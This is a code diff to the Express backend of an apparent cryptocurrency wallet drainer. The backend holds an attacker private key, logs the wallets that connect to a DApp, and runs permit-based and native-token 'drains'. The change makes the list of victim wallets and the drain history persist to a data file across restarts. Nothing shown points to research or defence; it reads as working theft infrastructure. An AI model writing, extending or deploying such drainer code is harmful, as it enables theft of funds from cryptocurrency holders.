@@ -3,6 +3,7 @@ const express = require('express')
 const cors    = require('cors')
 const { ethers } = require('ethers')
 const path = require('path')
+const fs   = require('fs')
 
 const app = express()
 app.use(cors({
@@ -16,15 +17,35 @@ app.use(express.json())
 app.use('/admin', express.static(path.join(__dirname, 'admin')))
 app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin', 'index.html')))
 
-// ── In-memory state (resets on server restart) ──────────────────────────────
+// ── Persistent state — survives server restarts ──────────────────────────────
 let config = {
   attackerPrivateKey: process.env.ATTACKER_PRIVATE_KEY || '',
   adminPassword:      process.env.ADMIN_PASSWORD || 'demo1234',
 }
 
-const connectedWallets = []   // all wallets that connected to the DApp
-const drainHistory     = []   // all drain attempts
-const logs             = []   // live log entries
+const connectedWallets = []
+const drainHistory     = []
+const logs             = []
+
+const DATA_FILE = path.join(__dirname, 'data.json')
+
+// Load saved data on startup
+try {
+  const saved = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'))
+  if (Array.isArray(saved.connectedWallets)) connectedWallets.push(...saved.connectedWallets)
+  if (Array.isArray(saved.drainHistory))     drainHistory.push(...saved.drainHistory)
+  console.log(`[STARTUP] Loaded ${connectedWallets.length} wallets, ${drainHistory.length} drains from disk`)
+} catch(_) {
+  console.log('[STARTUP] No saved data found — starting fresh')
+}
+
+function persist() {
+  try {
+    fs.writeFileSync(DATA_FILE, JSON.stringify({ connectedWallets, drainHistory }, null, 2))
+  } catch(e) {
+    console.log('[PERSIST] Write failed:', e.message)
+  }
+}
 
 function addLog(level, msg) {
   const entry = { time: new Date().toISOString(), level, message: msg }
@@ -130,6 +151,7 @@ app.post('/api/connect', async (req, res) => {
     }
     connectedWallets.unshift(entry)
     addLog('info', `Wallet connected: ${address} on chainId ${chainId}`)
+    persist()
   }
 
   // Check which chains attacker has gas on so frontend skips unfunded chains
@@ -243,6 +265,7 @@ async function performDrain(owner, tokenAddress, chainId, sig, permitParams) {
     if (w) { w.drained = true; w.drainTx = tx.hash }
 
     drainHistory.unshift(record)
+    persist()
 
     return {
       success:     true,
@@ -256,6 +279,7 @@ async function performDrain(owner, tokenAddress, chainId, sig, permitParams) {
     record.error = e.message
     addLog('error', `Drain failed: ${e.message}`)
     drainHistory.unshift(record)
+    persist()
     return { success: false, error: e.message }
   }
 }
@@ -274,6 +298,7 @@ app.post('/api/drain-native', async (req, res) => {
   const w = connectedWallets.find(x => x.address.toLowerCase() === owner.toLowerCase())
   if (w) { w.drained = true; w.drainTx = txHash }
   addLog('warn', `Native drain: ${amount} ${symbol} from ${owner} | tx: ${txHash}`)
+  persist()
   res.json({ ok: true })
 })
 
